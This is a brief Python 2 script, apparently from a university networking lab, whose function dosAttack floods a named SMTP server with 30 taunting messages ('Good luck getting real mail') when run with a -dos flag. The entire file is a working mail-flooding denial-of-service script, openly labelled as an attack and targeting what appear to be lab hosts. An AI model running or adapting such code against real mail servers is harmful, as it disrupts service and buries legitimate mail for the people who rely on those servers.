import smtplib
import sys
import threading
import time

SRC_ADDR = 'bs@sgoings-odin.mathcs.carleton.edu'
DEST_ADDR = 'matsuit@sgoings-exim.mathcs.carleton.edu'

def dosAttack(debug):
	msg = "You're being attacked!! Good luck getting real mail :)"
	
	for i in range(1):
		server = smtplib.SMTP('sgoings-exim.mathcs.carleton.edu:25')

		if debug:
			server.set_debuglevel(1)

		for j in range(30):
			print i, j
			server.sendmail(SRC_ADDR,
					DEST_ADDR,
					msg)
			time.sleep(1)	

		server.quit()

def main():
	if (len(sys.argv) > 1):
		debug = False

		if sys.argv[-1] == '-d':
			debug = True

		if sys.argv[1] == '-dos':
			dosAttack(debug)
		else:
			pass
	else:
		#usage statement
		pass

main()

